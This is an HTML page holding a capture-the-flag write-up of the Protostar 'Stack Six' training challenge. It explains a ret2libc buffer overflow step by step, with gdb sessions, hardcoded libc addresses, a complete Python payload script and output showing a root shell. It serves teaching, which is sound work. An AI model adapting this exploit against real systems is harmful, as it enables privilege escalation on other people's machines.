<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>

<section>

    <writeup>
        <h1><strong>#Protostar - Stack Six</strong></h1>
        <a href="https://exploit.education/protostar/stack-six/">https://exploit.education/protostar/stack-six/</a><br>
        <strong>NOTE</strong>: I'm exploiting stack7 on the protostar VM, not on my attacking system<br>
        <br>
        <img alt="images\7-1.png" src="images/7-1.png"><br>
        <br>
        In this challenge, the return address is restricted, which means we can't return to code on the stack.<br>
        However, as the challenge description mentions, we can do a ret2libc or ROP attack instead.<br>
        <br>
        I completed stack six with a ret2libc attack.<br>
        <br>
        <strong>What is ret2libc?</strong><br>
        <code>libc</code> is the standard C library, which contains functions like printf() (prints text) and system() (executes system commands).<br>
        <code>libc</code> is included in (basically) every C program. You'd be reinventing the wheel if you didn't use it.<br>
        <br>
        If we can't return to the stack, we can instead return to a function in libc.<br>
        This is what a ret2libc attack is.<br>
        <br>
        The easiest/most effective function to jump to in <code>libc</code> is <code>system()</code> - which executes system commands.<br>
        If we run <code>system("/bin/sh")</code>, we can spawn a shell.<br>
        <br>
        So, instead of writing and dropping shellcode onto the stack, we can simply jump to the address of <code>system()</code> in <code>libc</code>, write the argument of <code>/bin/sh</code> onto the stack, and spawn a shell. The genius of ret2libc is that we're re-using code that already exists within <code>libc</code> for our own exploitative purposes, not writing anything new.<br>
        <br>
        <strong>How to ret2libc?</strong><br>
        For a ret2libc attack, you need:<br>
        • the offset to EIP<br>
        • the address of <code>system()</code> on the target<br>
        • the address of <code>exit()</code> on the target (not nescessary, but good practice)<br>
        • the address of a <code>/bin/sh</code> string on the target<br>
        <br>
        Because GDB is installed on the target, we can find each of things using GDB.<br>
        <br>
        <a id="h2-1" name="h2-1"></a><strong></strong>
        <h2><strong>1) Find offset to EIP</strong></h2><br>
        SSH into your protostar VM with the credentials <code>user / user</code> (or just access it locally), and open the stack6 binary in gdb.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ssh&nbsp;user@192.168.1.72</span><br>
                <br>
                <br>
                &nbsp;&nbsp;&nbsp;&nbsp;PPPP&nbsp;&nbsp;RRRR&nbsp;&nbsp;&nbsp;OOO&nbsp;&nbsp;TTTTT&nbsp;&nbsp;OOO&nbsp;&nbsp;&nbsp;SSSS&nbsp;TTTTT&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;RRRR&nbsp;&nbsp;<br>
                &nbsp;&nbsp;&nbsp;&nbsp;P&nbsp;&nbsp;&nbsp;P&nbsp;R&nbsp;&nbsp;&nbsp;R&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;S&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;A&nbsp;&nbsp;R&nbsp;&nbsp;&nbsp;R&nbsp;<br>
                &nbsp;&nbsp;&nbsp;&nbsp;PPPP&nbsp;&nbsp;RRRR&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;SSS&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;AAAAA&nbsp;RRRR&nbsp;&nbsp;<br>
                &nbsp;&nbsp;&nbsp;&nbsp;P&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;R&nbsp;&nbsp;R&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;A&nbsp;R&nbsp;&nbsp;R&nbsp;&nbsp;<br>
                &nbsp;&nbsp;&nbsp;&nbsp;P&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;R&nbsp;&nbsp;&nbsp;R&nbsp;&nbsp;OOO&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;&nbsp;OOO&nbsp;&nbsp;SSSS&nbsp;&nbsp;&nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;A&nbsp;&nbsp;&nbsp;A&nbsp;R&nbsp;&nbsp;&nbsp;R&nbsp;<br>
                <br>
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>exploit-exercises.com<span style="color:#ff9d00;font-weight:700">/</span>protostar&nbsp;&nbsp;&nbsp;&nbsp;<br>
                <br>
                Welcome&nbsp;to&nbsp;Protostar.&nbsp;To&nbsp;log&nbsp;in,&nbsp;you&nbsp;may&nbsp;use&nbsp;the&nbsp;user&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;user&nbsp;account.<br>
                When&nbsp;you&nbsp;need&nbsp;to&nbsp;use&nbsp;the&nbsp;root&nbsp;account,&nbsp;you&nbsp;can&nbsp;<span style="color:#ff9d00;font-weight:700">login</span>&nbsp;as&nbsp;root&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;godmode.<br>
                [...]<br>
                $&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<br>
                $&nbsp;gdb&nbsp;-q&nbsp;stack6<br>
                Reading&nbsp;symbols&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack5...done.<br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;
            </div>
        </div><br>
        <br>
        On your attacking machine, generate a cyclic pattern using <code>msf-pattern_create</code>.<br>
        On Kali this is located at <code>/usr/share/metasploit-framework/tools/pattern_create.rb</code><br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msf-pattern_create&nbsp;-l&nbsp;100</span><br>
                Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
            </div>
        </div><br>
        <br>
        Back in gdb, run the binary and submit the cyclic pattern.<br>
        The binary should crash.<br>
            <div class="codebox">
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;run<br>
                Starting&nbsp;program<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack6&nbsp;<br>
                input&nbsp;path&nbsp;please<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A<br>
                got&nbsp;path&nbsp;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A<br>
                <br>
                Program&nbsp;received&nbsp;signal&nbsp;SIGSEGV,&nbsp;Segmentation&nbsp;fault.<br>
                0x37634136&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;??&nbsp;<span style="color:#ff9d00;font-weight:700">()</span>
            </div>
        </div><br>
        <br>
        The stack has been overflowed and EIP has been overwritten with <code>0x37634136</code>, which is part of our cyclic pattern.<br>
        <br>
        Submit the contents of EIP to <code>msf-pattern_offset</code>.<br>
        This will tell us the offset at which EIP gets overwritten.<br>
            <div class="codebox">
                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>exploit-education<span style="color:#ff9d00;font-weight:700">/</span>protostar]<br>
                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msf-pattern_offset&nbsp;-q&nbsp;0x37634136&nbsp;</span><br>
                [*]&nbsp;Exact&nbsp;match&nbsp;at&nbsp;offset&nbsp;80
            </div>
        </div><br>
        <br>
        Great!<br>
        The offset to overwrite EIP is <code>80</code>,<br>
        which means that we need to write 80 bytes of junk to overflow the buffer.<br>
        <br>
        <a id="h2-2" name="h2-2"></a><strong></strong>
        <h2><strong>2) Find ret2libc values</strong></h2><br>
        Next, we need to find the addresses for our ret2libc attack:<br>
        • the address of <code>system()</code> on the target<br>
        • the address of <code>exit()</code> on the target (not nescessary, but good practice)<br>
        • the address of a <code>/bin/sh</code> string on the target<br>
        <br>
        Back on Protostar, open stack6 in gdb.<br>
        Set a breakpoint on main, and run the program.<br>
        The binary will pause.<br>
            <div class="codebox">
                $&nbsp;gdb&nbsp;-q&nbsp;stack6<br>
                Reading&nbsp;symbols&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack6...done.<br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">break</span>&nbsp;main<br>
                Breakpoint&nbsp;1&nbsp;at&nbsp;0x8048500<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;stack6<span style="color:#ff9d00;font-weight:700">/</span>stack6.c,&nbsp;line&nbsp;27.<br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;run<br>
                Starting&nbsp;program<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack6&nbsp;<br>
                <br>
                Breakpoint&nbsp;1,&nbsp;main&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>argc=1,&nbsp;argv=0xbffffd64<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;stack6<span style="color:#ff9d00;font-weight:700">/</span>stack6.c<span style="color:#ff9d00;font-weight:700">:</span>27<br>
                27 stack6<span style="color:#ff9d00;font-weight:700">/</span>stack6.c<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;No&nbsp;such&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;or&nbsp;directory.<br>
                <span style="color:#ff9d00;font-weight:700">in</span>&nbsp;stack6<span style="color:#ff9d00;font-weight:700">/</span>stack6.c<br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;
            </div>
        </div><br>
        <br>
        <a id="h3-1" name="h3-1"></a><strong></strong>
        <h3><strong>2a) Find system() and exit() address</strong></h3><br>
        To find function addresses in GDB, use <code>print &lt;function&gt;</code><br>
            <div class="codebox">
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;print&nbsp;system<br>
                <span style="color:#7f0044;font-weight:400">$1</span>&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">{</span>&lt;text&nbsp;variable,&nbsp;no&nbsp;debug&nbsp;<span style="color:#ff9d00;font-weight:700">info</span>&gt;<span style="color:#ff9d00;font-weight:700">}</span>&nbsp;0xb7ecffb0&nbsp;&lt;__libc_system&gt;<br>
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;print&nbsp;<span style="color:#ff9d00;font-weight:700">exit</span><br>
                <span style="color:#7f0044;font-weight:400">$2</span>&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">{</span>&lt;text&nbsp;variable,&nbsp;no&nbsp;debug&nbsp;<span style="color:#ff9d00;font-weight:700">info</span>&gt;<span style="color:#ff9d00;font-weight:700">}</span>&nbsp;0xb7ec60c0&nbsp;&lt;*__GI_exit&gt;
            </div>
        </div><br>
        <br>
        Great!<br>
        system() is located at <code>0xb7ecffb0</code>,<br>
        and exit() is located at <code>0xb7ec60c0</code>.<br>
        <br>
        <a id="h3-2" name="h3-2"></a><strong></strong>
        <h3><strong>2b) Find /bin/sh string</strong></h3><br>
        To find a /bin/sh string, we first need to find libc's base address.<br>
        In gdb, use <code>info proc mapping</code> to view the memory map and look for the first instance of a libc library being loaded into memory, usually at offset 0.<br>
        <br>
        In the example below, libc's base address is located at <code>0xb7e97000</code><br>
            <div class="codebox">
                <span style="color:#ff9d00;font-weight:700">(</span>gdb<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">info</span>&nbsp;proc&nbsp;mapping<br>
                process&nbsp;3306<br>
                cmdline&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'/opt/protostar/bin/stack6'</span><br>
                cwd&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'/opt/protostar/bin'</span><br>
                exe&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'/opt/protostar/bin/stack6'</span><br>
                Mapped&nbsp;address&nbsp;spaces<span style="color:#ff9d00;font-weight:700">:</span><br>
                <br>
                Start&nbsp;Addr&nbsp;&nbsp;&nbsp;End&nbsp;Addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Size&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Offset&nbsp;objfile<br>
                &nbsp;0x8048000&nbsp;&nbsp;0x8049000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack6<br>
                &nbsp;0x8049000&nbsp;&nbsp;0x804a000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>opt<span style="color:#ff9d00;font-weight:700">/</span>protostar<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>stack6<br>
                0xb7e96000&nbsp;0xb7e97000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
                0xb7e97000&nbsp;0xb7fd5000&nbsp;&nbsp;&nbsp;0x13e000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>libc-2.11.2.so<br>
                0xb7fd5000&nbsp;0xb7fd6000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;0x13e000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>libc-2.11.2.so<br>
                0xb7fd6000&nbsp;0xb7fd8000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x2000&nbsp;&nbsp;&nbsp;0x13e000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>libc-2.11.2.so<br>
                0xb7fd8000&nbsp;0xb7fd9000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x1000&nbsp;&nbsp;&nbsp;0x140000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>libc-2.11.2.so<br>
                0xb7fd9000&nbsp;0xb7fdc000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x3000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
                [...]
            </div>
        </div><br>
        <br>
        Next, use <code>strings</code> on libc and <code>grep</code> for a <code>/bin/sh</code> string.<br>
            <div class="codebox">
                $&nbsp;strings&nbsp;-a&nbsp;-t&nbsp;x&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>lib<span style="color:#ff9d00;font-weight:700">/</span>libc-2.11.2.so&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">grep</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span><br>
                &nbsp;11f3bf&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span>
            </div>
        </div><br>
        <br>
        There's a <code>/bin/sh</code> string located at offset <code>0x11f3bf</code>.<br>
        <br>
        With libc's base address - <code>0xb7e97000</code><br>
        and the offset to /bin/sh - <code>0x11f3bf</code><br>
        we can add these 2 values together to find the address of /bin/sh in libc.<br>
        <br>
        (I used google to the addition)<br>
        <code>0xb7e97000</code> + <code>0x11f3bf</code> = <code>0xb7fb63bf</code><br>
        <br>
        Great!<br>
        A /bin/sh string is located at <code>0xb7fb63bf</code>.<br>
        <br>
        <a id="h2-3" name="h2-3"></a><strong></strong>
        <h2><strong>3) Write exploit</strong></h2><br>
        At this point, we have everything we need to write our exploit.<br>
        <br>
        <a id="h3-3" name="h3-3"></a><strong></strong>
        <h3><strong>Overview</strong></h3><br>
        system() is located at <code>0xb7ecffb0</code>.<br>
        exit() is located at <code>0xb7ec60c0</code><br>
        /bin/sh is located at <code>0xb7fb63bf</code><br>
        <br>
        We use <code>struct.pack('&lt;I'</code>, to pack the memory addresses in 32-bit little endian format.<br>
        <br>
        <a id="h3-4" name="h3-4"></a><strong></strong>
        <h3><strong>Payload Structure</strong></h3><br>
        On 32-bit systems, parameters for functions are read from the stack<br>
        <br>
        Our attack structure looks like this:<br>
        - Fill buffer<br>
        - Overwrite EIP with address of system()<br>
        - Write function return address to stack (can be junk or the address of exit())<br>
        - Write address of function parameter to stack - <code>/bin/sh</code><br>
        <br>
        <a id="h3-5" name="h3-5"></a><strong></strong>
        <h3><strong>Final Exploit Code</strong></h3><br>
        Here's my final exploit code:<br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;exploit-education&nbsp;-&nbsp;Stack&nbsp;Six</span><br>
                <br>
                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
                <br>
                bufferSize&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">80</span><br>
                <br>
                libc_base&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0xb7e97000</span><br>
                libc_binsh_off&nbsp;&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">0x0011f3bf</span><br>
                <br>
                libc_system_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0xb7ecffb0</span>)<br>
                libc_exit_addr&nbsp;&nbsp;&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0xb7ec60c0</span>)<br>
                libc_binsh_addr&nbsp;&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;libc_base&nbsp;+&nbsp;libc_binsh_off)<br>
                <br>
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*bufferSize<br>
                payload&nbsp;+=&nbsp;libc_system_addr<br>
                payload&nbsp;+=&nbsp;libc_exit_addr<br>
                payload&nbsp;+=&nbsp;libc_binsh_addr<br>
                <br>
                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
            </div>
        </div><br>
        <br>
        <a id="h2-4" name="h2-4"></a><strong></strong>
        <h2><strong>4) Win</strong></h2><br>
        Because we're spawning a shell, we need to halt the program with <code>cat</code> so that we can interact with the spawned shell.<br>
        Otherwise, the shell would spawn but the binary would quit immediately.<br>
        <br>
            <div class="codebox">
                $&nbsp;cd&nbsp;/opt/protostar/bin<br>
                $&nbsp;(python&nbsp;/tmp/stack6.py;&nbsp;cat)&nbsp;|&nbsp;./stack6<br>
                <span style="color:#ff9d00;font-weight:700">input</span>&nbsp;path&nbsp;please:&nbsp;got&nbsp;path&nbsp;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA����`췿c��<br>
                <span style="color:#ff9d00;font-weight:700">id</span><br>
                uid=<span style="color:#ff0044;font-weight:400">1001</span>(user)&nbsp;gid=<span style="color:#ff0044;font-weight:400">1001</span>(user)&nbsp;euid=<span style="color:#ff0044;font-weight:400">0</span>(root)&nbsp;groups=<span style="color:#ff0044;font-weight:400">0</span>(root),<span style="color:#ff0044;font-weight:400">1001</span>(user)<br>
                exit&nbsp;&nbsp;<br>
                <br>
                $&nbsp;
            </div>
        </div><br>
        <br>
        Success!<br>
        We've successfully returned to libc and spawned a shell :)<br>
        You can also see that, upon exit, the binary terminates cleanly, with no segmentation fault.<br>
        <br>
    </writeup>
</section>

</body>
</html>